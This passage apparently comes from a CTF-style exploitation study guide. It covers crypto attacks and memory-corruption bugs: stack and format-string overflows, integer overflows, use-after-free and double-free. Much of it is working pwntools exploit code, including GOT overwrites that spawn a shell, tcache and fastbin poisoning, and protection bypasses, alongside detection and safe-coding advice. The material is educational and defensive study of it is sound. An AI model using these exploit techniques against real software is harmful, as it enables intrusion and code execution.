# - Different HTTP status codes
```

**Exploitation:**

```bash
# padbuster tool
padbuster http://target/decrypt.php <encrypted> <block_size> \
  -encoding 0 -cookies "auth=<cookie>"

# Manual with requests
python3 padding_oracle_exploit.py
```

**Detection:**

- Application decrypts user-controlled data
- Different behavior on padding errors
- CBC mode with PKCS#7 padding

### Timing Attacks

**Vulnerable Comparison:**

```c
// Bad: Early exit on mismatch (timing leak)
int compare(char* a, char* b, int len) {
    for (int i = 0; i < len; i++) {
        if (a[i] != b[i]) return 0;
    }
    return 1;
}

// Good: Constant-time comparison
int secure_compare(char* a, char* b, int len) {
    int diff = 0;
    for (int i = 0; i < len; i++) {
        diff |= a[i] ^ b[i];
    }
    return (diff == 0);
}
```

**Testing for Timing Leaks:**

```python
import time
import statistics

timings = []
for attempt in range(1000):
    start = time.perf_counter()
    # Make authentication attempt
    result = check_password(attempt)
    timings.append(time.perf_counter() - start)

# Check for statistical difference
print(f"Mean: {statistics.mean(timings)}")
print(f"StdDev: {statistics.stdev(timings)}")
```

### ECB Mode Detection and Exploitation

**Visual Detection:**

```python
# For image files encrypted with ECB
from PIL import Image

# Read encrypted data
data = open('encrypted.bin', 'rb').read()

# Interpret as image (reveals patterns)
img = Image.frombytes('RGB', (width, height), data)
img.save('visual_ecb.png')
```

**Byte-flipping/Block Manipulation:**

```python
# ECB allows block reordering without detection
blocks = [ciphertext[i:i+16] for i in range(0, len(ciphertext), 16)]
# Swap blocks 0 and 2
blocks[0], blocks[2] = blocks[2], blocks[0]
modified = b''.join(blocks)
```

### Small RSA Exponent Without Padding

**Exploit (e=3, m^3 < n):**

```python
import gmpy2

c = <ciphertext_integer>
# Try direct cube root
m, exact = gmpy2.iroot(c, 3)
if exact:
    print(bytes.fromhex(hex(m)[2:]))
```

### Nonce Reuse Vulnerabilities

**CTR Mode Nonce Reuse:**

```python
# Same nonce + key = same keystream
# XOR two ciphertexts to get plaintext XOR
xor_result = bytes([c1[i] ^ c2[i] for i in range(len(c1))])
# xor_result = plaintext1 ^ plaintext2
```

**ECDSA Nonce Reuse (Sony PS3 Example):**

```python
# Two signatures with same k (nonce):
# k = (z1 - z2) / (s1 - s2) mod n
# Private key = (s*k - z) / r mod n
```

### Weak Hash Salting

**Problems:**

```python
# Bad: No salt
hash = md5(password)

# Bad: Global salt (rainbow tables still work)
hash = md5(password + "global_salt")

# Bad: Predictable salt
hash = md5(password + username)  # Username is known

# Good: Random unique salt per password
salt = os.urandom(16)
hash = hashlib.pbkdf2_hmac('sha256', password, salt, 100000)
```

## Important Related Topics

**Side-Channel Analysis:** Power analysis (DPA/SPA), electromagnetic emissions, cache timing attacks (Spectre/Meltdown variants)

**Block Cipher Modes Deep-Dive:** GCM authentication bypass, CFB/OFB implementation flaws, format-preserving encryption

**Lattice-Based Cryptanalysis:** LLL algorithm for low-dimensional lattices, Coppersmith's attack, knapsack cipher breaks

**Stream Cipher Cryptanalysis:** Linear/differential cryptanalysis, algebraic attacks, distinguishing attacks on reduced-round ciphers

**Post-Quantum Cryptography:** NIST PQC finalists (CRYSTALS-Kyber, CRYSTALS-Dilithium), lattice-based schemes, recognition in emerging implementations

---

# Vulnerability Classes

## Buffer Overflows and Stack Smashing

### Fundamentals

Buffer overflows occur when data written to a buffer exceeds its allocated boundary, overwriting adjacent memory. Stack-based buffer overflows specifically target the call stack, enabling control flow hijacking through overwriting return addresses, saved frame pointers, or function pointers.

**Stack Layout (x86/x64):**

```
High Address
+------------------+
| Command line args|
+------------------+
| Environment vars |
+------------------+
| Stack (grows ↓)  |
|   Local vars     |
|   Saved EBP/RBP  |
|   Return address |
|   Function args  |
+------------------+
| Heap (grows ↑)   |
+------------------+
Low Address
```

### Detection Techniques

**Static Analysis:**

```bash
# Check for dangerous functions
grep -r "strcpy\|strcat\|gets\|sprintf\|scanf" source.c

# IDA Pro/Ghidra: Look for unbounded copy operations
# Binary Ninja: Identify missing bounds checks
```

**Dynamic Analysis with GDB + GEF:**

```bash
# Install GEF
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"

# Basic overflow detection
gdb ./vulnerable
gef> pattern create 200
gef> run
# Paste pattern as input
gef> pattern offset $rsp  # Find offset to return address
```

**Fuzzing with AFL++:**

```bash
# Compile with instrumentation
afl-gcc -o target target.c

# Create test cases
mkdir input output
echo "AAAA" > input/seed

# Fuzz
afl-fuzz -i input -o output ./target @@
```

### Exploitation Methodology

**Basic Stack Overflow Exploitation:**

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
binary = ELF('./vulnerable')
p = process('./vulnerable')
# p = remote('target.ctf', 1337)  # For remote

# Find offset
offset = cyclic_find(0x61616161)  # Or use GDB pattern offset

# Build payload
payload = flat(
    b'A' * offset,           # Padding to return address
    p64(win_function_addr)   # Overwrite return address
)

# Send and interact
p.sendline(payload)
p.interactive()
```

**Finding Gadgets and Functions:**

```bash
# Extract useful addresses
readelf -s vulnerable | grep win
objdump -d vulnerable | grep -A 10 "win"

# Using radare2
r2 -AA vulnerable
[0x00400000]> afl  # List functions
[0x00400000]> s sym.win
[0x00400000]> pdf  # Print disassembly
```

### Protection Bypass Techniques

**Stack Canaries:**

- Canary values placed between buffers and control data
- Detection: `checksec --file=binary` shows "Canary: found"
- Bypass methods:
    1. **Leak canary via format string**: Read canary value before overflow
    2. **Brute force (32-bit)**: Try all byte combinations
    3. **Fork-based bypass**: Child processes inherit canary

```python
# Canary leak example
payload = b'%7$p'  # Leak stack value at offset 7
p.sendline(payload)
canary = int(p.recv().strip(), 16)

# Rebuild payload with correct canary
payload = flat(
    b'A' * buf_size,
    p64(canary),
    b'B' * 8,  # Saved RBP
    p64(target_addr)
)
```

**ASLR (Address Space Layout Randomization):**

```bash
# Check ASLR status
cat /proc/sys/kernel/randomize_va_space
# 0 = disabled, 1 = conservative, 2 = full

# Bypass via information leak
# 1. Leak PIE base address
# 2. Calculate offsets from leak
# 3. Adjust payload addresses
```

**NX/DEP (Non-Executable Stack):**

- Cannot execute shellcode directly on stack
- Bypass using Return-to-libc or ROP chains

**PIE (Position Independent Executable):**

```bash
checksec --file=binary
# PIE: enabled - all addresses randomized
# PIE: disabled - code segment at fixed address
```

### Advanced Techniques

**Partial Overwrite:** When ASLR is enabled but you can't leak full addresses:

```python
# Overwrite only lowest bytes (often consistent)
payload = b'A' * offset + b'\x37\x13'  # Partial RIP overwrite
```

**Stack Pivoting:** Redirect stack pointer to controlled memory region:

```python
# Find gadget: pop rsp; ret
from ropper import RopperService
rs = RopperService()
rs.addFile('./binary')
rs.loadGadgetsFor()
gadgets = rs.search(search='pop rsp')
```

### Tools and Commands

**Pattern Generation:**

```bash
# pwntools
python3 -c "from pwn import *; print(cyclic(200))"

# GEF
gef> pattern create 200

# Metasploit
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
```

**Binary Security Checks:**

```bash
# checksec
checksec --file=vulnerable

# readelf
readelf -l vulnerable | grep GNU_STACK

# objdump
objdump -x vulnerable | grep STACK
```

**Debugging:**

```bash
# GDB with GEF
gdb -q ./vulnerable
gef> checksec
gef> vmmap
gef> telescope $rsp 20
gef> heap chunks
```

## Format String Vulnerabilities

### Fundamentals

Format string vulnerabilities occur when user-controlled input is passed as the format specifier to functions like `printf()`, `sprintf()`, `fprintf()`, or `syslog()` without proper sanitization.

**Vulnerable Pattern:**

```c
// Vulnerable
char buffer[100];
fgets(buffer, sizeof(buffer), stdin);
printf(buffer);  // User controls format string

// Safe
printf("%s", buffer);
```

### Format Specifiers Reference

```
%d, %i    - Signed decimal integer
%u        - Unsigned decimal integer
%x, %X    - Hexadecimal
%p        - Pointer address
%s        - String (dereferences pointer)
%n        - Writes number of bytes printed so far
%hn       - Writes short (2 bytes)
%hhn      - Writes single byte
%lln      - Writes long long (8 bytes)
%<num>$x  - Direct parameter access (parameter num)
```

### Detection and Reconnaissance

**Testing for Format String Vulnerability:**

```bash
# Input various format specifiers
echo "%x %x %x %x" | ./vulnerable
echo "%p %p %p %p" | ./vulnerable
echo "%s %s %s %s" | ./vulnerable  # May crash if invalid pointer

# Check for direct parameter access
echo "%1\$x %2\$x %3\$x" | ./vulnerable
```

**Automated Detection:**

```bash
# Using AFL++ with format string dictionary
echo "%n" > fmtstr.dict
echo "%s" >> fmtstr.dict
echo "%x" >> fmtstr.dict
afl-fuzz -i input -o output -x fmtstr.dict ./vulnerable
```

### Information Leakage Exploitation

**Stack Dumping:**

```python
#!/usr/bin/env python3
from pwn import *

p = process('./vulnerable')

# Dump stack values
for i in range(1, 50):
    p.sendline(f'%{i}$p'.encode())
    leak = p.recvline()
    print(f'Offset {i}: {leak.decode().strip()}')
```

**Leaking Specific Addresses:**

```python
# Leak canary (typically at fixed offset)
payload = b'%13$p'  # Adjust offset as needed
p.sendline(payload)
canary = int(p.recvline().strip(), 16)

# Leak PIE/ASLR base
payload = b'%15$p'  # Leak code pointer
p.sendline(payload)
leak = int(p.recvline().strip(), 16)
base = leak - known_offset
```

**Reading Arbitrary Memory:**

```python
# Read string at specific address
target_addr = 0x0804a000

payload = flat(
    p32(target_addr),
    b'%4$s'  # Read string at 4th parameter (our address)
)
p.sendline(payload)
data = p.recvuntil(b'\x00')
```

### Arbitrary Write Exploitation

**Basic Write with %n:**

```python
# Write to GOT entry to hijack function
target_addr = elf.got['printf']
win_addr = elf.symbols['win']

# Split address into writes
low_bytes = win_addr & 0xFFFF
high_bytes = (win_addr >> 16) & 0xFFFF

payload = flat(
    p32(target_addr),      # Low bytes target
    p32(target_addr + 2),  # High bytes target
    f'%{low_bytes - 8}c%4$hn'.encode(),   # Write low bytes
    f'%{high_bytes - low_bytes}c%5$hn'.encode()  # Write high bytes
)
```

**Using pwntools fmtstr Module:**

```python
from pwn import *

def send_payload(payload):
    p.sendline(payload)
    return p.recvline()

# Automatic format string exploitation
autofmt = FmtStr(execute_fmt=send_payload)
offset = autofmt.offset  # Finds offset automatically

# Write to arbitrary address
payload = fmtstr_payload(offset, {target_addr: win_addr})
p.sendline(payload)
```

### Advanced Techniques

**GOT Overwrite:**

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./vulnerable')
p = process('./vulnerable')

# Target GOT entry of frequently called function
got_printf = elf.got['printf']
system_plt = elf.plt['system']  # Or libc address if leaked

# Build format string payload
writes = {got_printf: system_plt}
payload = fmtstr_payload(offset, writes)

p.sendline(payload)
p.sendline(b'/bin/sh')  # Next printf call becomes system("/bin/sh")
p.interactive()
```

**Stack Value Modification:**

```python
# Modify return address on stack
# 1. Find return address offset
# 2. Calculate target address
# 3. Write new return address

ret_addr_offset = 10  # Stack offset to return address
target = 0x08048abc

payload = fmtstr_payload(ret_addr_offset, {
    'relative_write': True,  # Write relative to format string position
}, write_size='short')
```

**Bypassing FORTIFY_SOURCE:** `-D_FORTIFY_SOURCE=2` adds runtime checks for format string functions.

[Inference] Bypass methods may include:

- Using functions not covered by FORTIFY
- Exploiting logic before checks occur
- Leveraging TOCTOU (Time-of-check-time-of-use) conditions

### Tools and Utilities

**Finding Format String Offset:**

```python
# Manual method
from pwn import *
p = process('./vulnerable')
p.sendline(b'AAAA %x %x %x %x %x %x %x %x')
output = p.recvline()
# Look for '41414141' (AAAA in hex)

# Automated with pwntools
autofmt = FmtStr(execute_fmt=lambda x: send_and_recv(x))
print(f'Offset: {autofmt.offset}')
```

**Format String Builder:**

```python
def build_fmtstr(offset, writes, write_size='byte'):
    """
    offset: Stack offset to format string
    writes: {addr: value} dictionary
    write_size: 'byte', 'short', or 'int'
    """
    payload = b''
    addrs = []
    values = []
    
    for addr, value in writes.items():
        if write_size == 'byte':
            for i in range(4):
                addrs.append(addr + i)
                values.append((value >> (8 * i)) & 0xFF)
        # Add similar logic for short/int
    
    # Build payload with addresses first, then format specifiers
    return payload
```

**GDB Debugging:**

```bash
gdb ./vulnerable
gef> b printf
gef> run
# Input: AAAA %x %x %x
gef> x/20wx $rsp  # Examine stack
gef> telescope $rsp 30  # GEF's enhanced stack view
```

## Integer Overflows/Underflows

### Fundamentals

Integer overflow occurs when arithmetic operations produce results exceeding the maximum value for a data type, causing wraparound. Underflow is the opposite—dropping below the minimum value.

**Size Limits (Signed):**

```
int8_t:   -128 to 127
int16_t:  -32,768 to 32,767
int32_t:  -2,147,483,648 to 2,147,483,647
int64_t:  -9,223,372,036,854,775,808 to 9,223,372,036,854,775,807

Unsigned: 0 to (2^n - 1)
```

**Wraparound Behavior:**

```c
uint8_t x = 255;
x = x + 1;  // x = 0 (overflow)

uint8_t y = 0;
y = y - 1;  // y = 255 (underflow)

int8_t z = 127;
z = z + 1;  // z = -128 (signed overflow)
```

### Vulnerability Patterns

**Buffer Allocation Vulnerabilities:**

```c
// Vulnerable: size calculation overflow
void vulnerable(unsigned int len) {
    unsigned int total = len + 4;  // Can overflow
    char *buffer = malloc(total);
    memcpy(buffer, user_data, len);  // Buffer too small
}

// Exploitation: len = 0xFFFFFFFC
// total = 0xFFFFFFFC + 4 = 0 (wraps to 0)
// malloc(0) may return small/null pointer
```

**Array Index Vulnerabilities:**

```c
// Vulnerable: unchecked array access
int array[10];
unsigned int idx;
scanf("%u", &idx);

if (idx < 10) {  // Check seems safe
    array[idx] = value;  // But negative signed conversion possible
}
```

**Size Comparison Issues:**

```c
// Vulnerable: signed/unsigned comparison
void copy_data(int size, char *src) {
    if (size > MAX_SIZE) return;  // Check with signed comparison
    
    char buffer[1024];
    memcpy(buffer, src, size);  // size implicitly converted to size_t (unsigned)
}

// Exploitation: size = -1
// -1 > MAX_SIZE is false (signed comparison)
// memcpy sees size as 0xFFFFFFFF (huge unsigned value)
```

### Detection Techniques

**Static Analysis:**

```bash
# Scan for arithmetic operations near allocations
grep -B 5 -A 5 "malloc\|calloc\|realloc" source.c | grep "+\|-\|*"

# Check for unsafe type conversions
grep "unsigned.*=.*signed\|signed.*=.*unsigned" source.c
```

**Using Clang Static Analyzer:**

```bash
# Check for integer overflow
scan-build gcc -o target target.c

# Specific checkers
clang --analyze -Xanalyzer -analyzer-checker=security.insecureAPI.UncheckedReturn target.c
```

**Dynamic Testing with GDB:**

```bash
gdb ./vulnerable
gef> catch syscall malloc
gef> commands
> print $rdi  # Print size argument (x86-64)
> continue
> end
gef> run
# Monitor malloc sizes for suspicious values (very large or very small)
```

### Exploitation Methodology

**Heap Overflow via Integer Overflow:**

```python
#!/usr/bin/env python3
from pwn import *

p = process('./vulnerable')

# Trigger integer overflow in size calculation
# If buffer_size = input_len + 100
# Send input_len = 0xFFFFFF9C (4294967196)
# buffer_size = 0xFFFFFF9C + 0x64 = 0x0 (overflow)

malicious_size = 0xFFFFFF9C
p.sendline(str(malicious_size).encode())

# Send actual large data to overflow small allocated buffer
payload = b'A' * 0x1000 + p64(overwrite_target)
p.sendline(payload)
```

**Bypassing Size Checks:**

```python
# When check is: if (user_size < MAX_SIZE)
# But allocation is: malloc(user_size + overhead)

MAX_SIZE = 0x1000
overhead = 0x10

# Calculate overflow value
target_alloc = 0x20  # Want small allocation
user_size = 0xFFFFFFFF - overhead + target_alloc + 1

# user_size + overhead = target_alloc (after wraparound)
p.sendline(str(user_size).encode())
```

**Exploiting Signed/Unsigned Confusion:**

```python
# When function takes signed int but uses as unsigned size_t
# Send negative value that passes signed checks but becomes large unsigned

size_input = -1  # 0xFFFFFFFF as unsigned
p.sendline(str(size_input).encode())

# Now can read/write arbitrary amounts
```

### Real-World CVE Examples

**CVE-2009-1895 (Linux Kernel personality())**:

- Integer underflow in personality system call
- `pid_t` value could underflow, bypassing security checks

**CVE-2013-2094 (perf_swevent_init)**:

- Integer overflow in Linux kernel perf subsystem
- Allowed arbitrary kernel memory access

[Unverified] Specific exploitation details should be verified from official CVE databases and security advisories.

### Protection Mechanisms

**Compiler Protections:**

```bash
# GCC/Clang flags
-fsanitize=signed-integer-overflow    # Detect signed overflows
-fsanitize=unsigned-integer-overflow  # Detect unsigned overflows
-ftrapv                               # Trap on signed overflow
-fwrapv                               # Define signed overflow as two's complement wraparound

# Compile with sanitizer
gcc -fsanitize=signed-integer-overflow -g -o target target.c
```

**Safe Integer Operations:**

```c
#include <stdint.h>
#include <stdbool.h>

// Safe addition check
bool safe_add(uint32_t a, uint32_t b, uint32_t *result) {
    if (a > UINT32_MAX - b) {
        return false;  // Would overflow
    }
    *result = a + b;
    return true;
}

// Safe multiplication check
bool safe_mul(uint32_t a, uint32_t b, uint32_t *result) {
    if (a != 0 && b > UINT32_MAX / a) {
        return false;  // Would overflow
    }
    *result = a * b;
    return true;
}
```

**GCC Built-in Overflow Checking:**

```c
#include <stddef.h>

unsigned int a = 0xFFFFFFFF;
unsigned int b = 2;
unsigned int result;

if (__builtin_add_overflow(a, b, &result)) {
    // Overflow occurred
    handle_error();
} else {
    // Safe to use result
    use_value(result);
}
```

### Testing Strategies

**Boundary Value Testing:**

```python
# Test values near type boundaries
test_values = [
    0, 1, 2,                    # Lower boundary
    0x7FFFFFFE, 0x7FFFFFFF,     # INT_MAX region (32-bit signed)
    0x80000000, 0x80000001,     # Sign flip region
    0xFFFFFFFE, 0xFFFFFFFF,     # UINT_MAX region (32-bit unsigned)
]

for val in test_values:
    p = process('./target')
    p.sendline(str(val).encode())
    # Monitor for crashes or unexpected behavior
```

**Fuzzing with AFL++:**

```bash
# Create seed inputs with boundary values
python3 << EOF > seeds/boundaries.txt
import struct
values = [0, 1, 0x7FFFFFFF, 0x80000000, 0xFFFFFFFF]
for v in values:
    print(struct.pack('<I', v).hex())
EOF

# Fuzz with integer-aware mutations
afl-fuzz -i seeds -o output -m none ./target @@
```

## Use-After-Free (UAF)

### Fundamentals

Use-after-free vulnerabilities occur when a program continues to use a pointer after the memory it references has been freed. The freed memory may be reallocated for different purposes, allowing attackers to control the data at the original pointer location.

**Vulnerable Pattern:**

```c
struct object *ptr = malloc(sizeof(struct object));
// Use ptr...
free(ptr);
// ptr still points to freed memory

// Later in code (dangling pointer dereference)
ptr->function_pointer();  // UAF vulnerability
```

**Exploitation Window:**

```
1. Object allocated → ptr points to valid memory
2. Object freed → memory returned to allocator
3. Attacker triggers allocation → controlled data occupies freed space
4. Original ptr dereferenced → executes attacker-controlled data
```

### Detection Techniques

**Dynamic Analysis with Valgrind:**

```bash
# Install valgrind
apt-get install valgrind

# Detect invalid memory access
valgrind --leak-check=full --show-leak-kinds=all --track-origins=yes ./vulnerable

# Use-after-free specific detection
valgrind --tool=memcheck --free-fill=0xDE --malloc-fill=0xAB ./vulnerable
```

**AddressSanitizer (ASan):**

```bash
# Compile with ASan
gcc -fsanitize=address -g -o target target.c

# Run
./target
# ASan will report use-after-free with detailed stack traces

# Additional flags
-fsanitize=address -fno-omit-frame-pointer -O1
```

**GDB Watchpoints:**

```bash
gdb ./vulnerable
gef> b free
gef> commands
> set $saved_addr = $rdi  # Save freed address
> watch *(char*)$saved_addr  # Watch for access after free
> continue
> end
gef> run
```

### Heap Internals Understanding

**Glibc malloc (ptmalloc2):**

```
Chunk structure:
+-------------------+
| prev_size         | (if previous chunk is free)
+-------------------+
| size | flags      | (size includes metadata)
+-------------------+
| fd (forward ptr)  | (when freed - in free list)
+-------------------+
| bk (backward ptr) | (when freed - in free list)
+-------------------+
| user data...      |
+-------------------+

Flags: PREV_INUSE (0x1), IS_MMAPPED (0x2), NON_MAIN_ARENA (0x4)
```

**Bin Types:**

```
Fast bins:  16-80 bytes (single-linked, LIFO)
Small bins: <1024 bytes (double-linked, FIFO)
Large bins: ≥1024 bytes (double-linked, sorted by size)
Unsorted bin: Temporary storage before sorting
Tcache: Per-thread cache (7 entries per size)
```

**Heap Visualization:**

```bash
gdb ./vulnerable
gef> heap chunks
gef> heap bins
gef> vis_heap_chunks

# pwndbg alternative
pwndbg> heap
pwndbg> bins
```

### Exploitation Methodology

**Basic UAF Exploitation:**

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./vulnerable')
p = process('./vulnerable')

# Step 1: Allocate victim object
p.sendline(b'1')  # Allocate command
p.recvuntil(b'index: ')
victim_idx = int(p.recvline().strip())

# Step 2: Free victim object (creates dangling pointer)
p.sendline(b'2')  # Free command
p.sendline(str(victim_idx).encode())

# Step 3: Allocate attacker-controlled object of same size
p.sendline(b'1')  # Allocate command
p.recvuntil(b'data: ')

# Craft fake object with controlled function pointer
fake_object = flat(
    p64(0x4141414141414141),  # Fake data fields
    p64(elf.symbols['win'])   # Function pointer → win function
)
p.sendline(fake_object)

# Step 4: Trigger use of freed object
p.sendline(b'3')  # Use command (calls function pointer)
p.sendline(str(victim_idx).encode())

p.interactive()
```

**Heap Spray Technique:**

```python
# When allocation timing is uncertain, spray heap with controlled data
def heap_spray(size, count=100):
    fake_obj = p64(target_addr) * (size // 8)
    
    for i in range(count):
        p.sendline(b'1')  # Allocate
        p.sendline(fake_obj)
    
    # High probability attacker data fills freed slot
```

**Tcache Poisoning (glibc ≥2.26):**

```python
# Tcache doesn't check for double-free or corruption until 2.29
# Exploit: poison tcache to return arbitrary address

# 1. Fill tcache bin with target size
for i in range(7):  # Tcache holds 7 entries
    allocate(0x20)

# 2. Free objects to populate tcache
for i in range(7):
    free(i)

# 3. Free again (double-free, less protected in older versions)
free(6)

# 4. Allocate and overwrite fd pointer
allocate(0x20)
write(p64(target_addr))  # Poison tcache->next

# 5. Subsequent allocations return attacker-controlled address
allocate(0x20)  # Returns normal chunk
allocate(0x20)  # Returns target_addr
```

### Advanced Techniques

**VTABLE Hijacking:**

```python
# C++ objects with virtual functions store vtable pointer
# Exploit: overwrite vtable pointer in freed object

# Craft fake vtable in controlled memory
fake_vtable = flat(
    p64(elf.symbols['system']),  # First virtual function
    p64(elf.symbols['exit']),    # Second virtual function
    # ...
)

# Write fake vtable to known location (e.g., .bss)
write_primitive(bss_addr, fake_vtable)

# Allocate into freed C++ object slot
fake_object = flat(
    p64(bss_addr),  # Overwrite vtable pointer
    b'/bin/sh\x00'  # Useful data
)

allocate_into_uaf_slot(fake_object)
trigger_virtual_call()  # Calls system('/bin/sh')
```

**File Stream Exploitation (_IO_FILE):**

```python
# Exploit FILE structure use-after-free
# FILE structures contain function pointers in vtable

# Locate FILE structure
file_ptr = leak_file_pointer()

# Craft fake FILE + fake vtable
fake_file = flat(
    # FILE structure fields...
    p64(fake_vtable_addr),  # _vtable pointer
)

fake_vtable = flat(
    # Offset to __overflow function
    p64(0) * 3,
    p64(one_gadget),  # __overflow called by fflush/fclose
)
```

**Fastbin Attack:**

```python
# Requirements: control over freed chunk's fd pointer
# Goal: make malloc return arbitrary address

# 1. Free chunk into fastbin
free(chunk_A)  # chunk_A->fd = NULL

# 2. Trigger UAF write to overwrite fd
uaf_write(chunk_A + 8, p64(target_addr - 0x10))

# 3. Allocate twice
alloc_1 = malloc(size)  # Returns chunk_A
alloc_2 = malloc(size)  # Returns target_addr - 0x10

# 4. Write to alloc_2 writes to target_addr
```

### Protection Bypasses

**Safe-Linking (glibc ≥2.32):**

```
Tcache and fastbin fd pointers are mangled:
fd = (ptr >> 12) ^ next_ptr

Bypass requires:
1. Leak heap address (for >> 12 value)
2. Calculate: mangled = (heap >> 12) ^ target
```

```python
# Leak heap pointer
heap_leak = leak_heap_address()
heap_base = heap_leak & ~0xFFF

# Calculate mangled pointer
target = 0x7ffff7dd0000
mangled = ((heap_leak >> 12) ^ target)

# Use mangled value in exploit
overwrite_fd(p64(mangled))
```

### Tools and Utilities

**Heap Exploitation Helper:**

```python
from pwn import *

def alloc(size, data=b''):
    p.sendline(b'1')
    p.sendline(str(size).encode())
    if data:
        p.sendline(data)
    p.recvuntil(b'index: ')
    return int(p.recvline().strip())

def free(idx):
    p.sendline(b'2')
    p.sendline(str(idx).encode())

def edit(idx, data):
    p.sendline(b'3')
    p.sendline(str(idx).encode())
    p.sendline(data)

def show(idx):
    p.sendline(b'4')
    p.sendline(str(idx).encode())
    return p.recvline()
```

**GDB Heap Analysis:**

```bash
# GEF commands
gef> heap chunks
gef> heap bins fast
gef> heap bins tcache
gef> heap arenas

# Find references to freed memory
gef> search-pattern <freed_address>

# Break on allocation/free
gef> catch syscall brk
gef> catch syscall mmap
```

**HeapInspect Tool:**

```bash
git clone https://github.com/matrix1001/heapinspect
cd heapinspect
pip install -e .

# Use in Python
from HeapInspect import *
hi = HeapInspect()
hi.heap_info()
```

## Double-Free Vulnerabilities

### Fundamentals

Double-free occurs when `free()` is called multiple times on the same memory address without intervening allocations. This corrupts heap metadata, enabling arbitrary memory writes and control flow hijacking.

**Vulnerable Pattern:**

```c
char *ptr = malloc(100);
free(ptr);
// ... some code ...
free(ptr);  // Double-free vulnerability
```

**Why It's Dangerous:**

1. First `free()` adds chunk to free list
2. Second `free()` adds same chunk again → corrupted list structure
3. Subsequent `malloc()` can return overlapping/arbitrary addresses
4. Enables heap metadata manipulation

### Detection Mechanisms

**Glibc Protections:**

```c
// Glibc checks (simplified):
// 1. Fast bin: prevents immediate double-free
if (chunk == fastbin_top) {
    abort();  // "double free or corruption (fasttop)"
}

// 2. Check for corruption during consolidation
if (prev_inuse(nextchunk) == 0) {
    abort();  // "double free or corruption (!prev)"
}
```

**Runtime Detection with ASan:**

```bash
gcc -fsanitize=address -g -o target target.c
./target
# ASan output:
# ERROR: AddressSanitizer: attempting

# double-free on 0x602000000010

# Additional ASan flags for heap debugging

ASAN_OPTIONS=detect_leaks=1:abort_on_error=1:symbolize=1 ./target

````

**Valgrind Detection:**
```bash
valgrind --tool=memcheck --track-origins=yes ./vulnerable
# Output:
# Invalid free() / delete / delete[] / realloc()
#   at 0x4C2EDEB: free (vg_replace_malloc.c:530)
#   Address 0x5200040 is 0 bytes inside a block of size 100 free'd
````

**GDB Detection:**

```bash
gdb ./vulnerable
gef> catch syscall brk

# Set breakpoint on free
gef> b free
gef> commands
> set $freed_addr = $rdi
> printf "Freeing: 0x%lx\n", $freed_addr
> continue
> end

# Watch for repeated addresses
gef> run
```

### Heap Allocator Internals

**Tcache Structure (glibc ≥2.26):**

```c
typedef struct tcache_perthread_struct {
    char counts[TCACHE_MAX_BINS];  // Entry counts per bin
    tcache_entry *entries[TCACHE_MAX_BINS];  // Singly-linked lists
} tcache_perthread_struct;

typedef struct tcache_entry {
    struct tcache_entry *next;
    // Optional key field (≥2.29 for double-free detection)
    struct tcache_perthread_struct *key;
} tcache_entry;
```

**Fast Bin Structure:**

```c
// Per-arena fastbins (10 bins for sizes 16-80 bytes)
mfastbinptr fastbinsY[NFASTBINS];

// Each fastbin is single-linked list (LIFO)
struct malloc_chunk {
    size_t prev_size;
    size_t size;
    struct malloc_chunk *fd;  // Forward pointer when free
};
```

**Protection Evolution:**

```
glibc 2.25: Minimal double-free checks
glibc 2.26: Tcache introduced (weaker checks)
glibc 2.27: Tcache double-free checks added
glibc 2.29: Tcache key field for enhanced protection
glibc 2.32: Safe-linking (pointer mangling)
```

### Exploitation Techniques

**Basic Double-Free (Tcache, glibc 2.26-2.28):**

```python
#!/usr/bin/env python3
from pwn import *

p = process('./vulnerable')

# Allocate victim chunk
idx1 = alloc(0x20, b'AAAA')

# Double-free into tcache
free(idx1)
free(idx1)  # No immediate detection in early tcache versions

# Now tcache[0x20] → chunk → chunk (loop)
# Allocate to get chunk back
alloc(0x20, p64(target_addr))  # Overwrite tcache->next

# Next two allocations:
alloc(0x20, b'data1')  # Returns original chunk
alloc(0x20, b'PWNED')  # Returns target_addr!
```

**Double-Free with Intermediate Free:**

```python
# Bypass "double free or corruption (fasttop)" check
# Requirement: free different chunk between double-frees

chunk_A = alloc(0x60)
chunk_B = alloc(0x60)

free(chunk_A)
free(chunk_B)  # Intermediate free
free(chunk_A)  # Now allowed - chunk_A ≠ fastbin_top

# Fastbin[0x60]: A → B → A
# Creates circular/overlapping allocation possibility
```

**Tcache Poisoning via Double-Free:**

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
p = process('./vulnerable')
elf = ELF('./vulnerable')

# Step 1: Double-free into tcache
victim = alloc(0x40)
free(victim)
free(victim)  # tcache[0x40]: victim → victim

# Step 2: Allocate once, write fake forward pointer
alloc(0x40, p64(elf.got['free']))  # Overwrite victim->next

# Step 3: Allocate twice to reach GOT
alloc(0x40, b'dummy')      # Returns victim
alloc(0x40, p64(elf.plt['system']))  # Returns GOT entry, overwrites free@got

# Step 4: Free with '/bin/sh' triggers system
alloc(0x40, b'/bin/sh\x00')
free(last_chunk)  # Calls system('/bin/sh')

p.interactive()
```

**Fastbin Dup to Arbitrary Write:**

```python
# Goal: Allocate chunk at arbitrary address

# 1. Create double-free scenario
chunk_A = alloc(0x68)
chunk_B = alloc(0x68)
chunk_C = alloc(0x68)  # Prevent consolidation

free(chunk_A)
free(chunk_B)
free(chunk_A)  # Fastbin: A → B → A

# 2. Allocate and poison fastbin
alloc(0x68, p64(target_addr - 0x10))  # A's fd → target
# Fastbin: B → A → target

# 3. Allocate three times
alloc(0x68)  # Returns B
alloc(0x68)  # Returns A
alloc(0x68)  # Returns target_addr - 0x10

# 4. Write to "target" chunk writes to target_addr
```

### Bypassing Modern Protections

**Tcache Key Check Bypass (glibc ≥2.29):**

```c
// glibc 2.29+ adds key field to detect double-free
typedef struct tcache_entry {
    struct tcache_entry *next;
    struct tcache_perthread_struct *key;  // Points to tcache structure
} tcache_entry;

// Check during free:
if (e->key == tcache) {
    // Double-free detected
    abort();
}
```

**Bypass Method 1: Overwrite Key Field:**

```python
# After first free, chunk has valid key field
free(chunk)

# Use UAF or overflow to zero out key field
uaf_write(chunk + 8, p64(0))  # Overwrite key to NULL

# Now double-free succeeds
free(chunk)  # key == NULL, check passes
```

**Bypass Method 2: Allocate Between Frees:**

```python
# Allocate same-sized chunk to clear tcache entry
free(chunk_A)
free(chunk_B)  # Fills tcache slot
alloc(0x20)    # Retrieves chunk_A, clears its key
